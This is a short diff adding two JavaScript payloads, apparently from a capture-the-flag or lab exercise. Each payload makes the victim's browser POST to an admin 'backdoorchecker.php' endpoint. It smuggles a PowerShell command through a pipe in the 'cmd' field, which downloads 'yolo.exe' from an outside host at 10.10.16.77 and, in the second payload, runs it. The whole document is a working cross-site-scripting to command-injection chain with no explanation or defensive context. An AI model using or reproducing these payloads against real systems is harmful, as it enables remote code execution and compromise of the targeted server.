@@ -1,0 +1,6 @@
+<script> x=new XMLHttpRequest(); params="cmd=dir|powershell iwr http://10.10.16.77:80/yolo.exe -outfile C:/ProgramData/yolo.exe;";
+x.open("POST","http://localhost/admin/backdoorchecker.php",true); x.setRequestHeader("Content -type","application/x-www-form-urlencoded"); x.onload=function()
+{document.write(this.responseText)}; x.send(params); </script>
+
+
+<script>var http = new XMLHttpRequest();var url='/admin/backdoorchecker.php';var params='cmd=dir| powershell -c "iwr -uri http://10.10.16.77:80/yolo.exe -outfile %temp%\\yy.exe";%temp%\\yy.exe';http.open('POST',url,true);http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');http.send(params);</script>
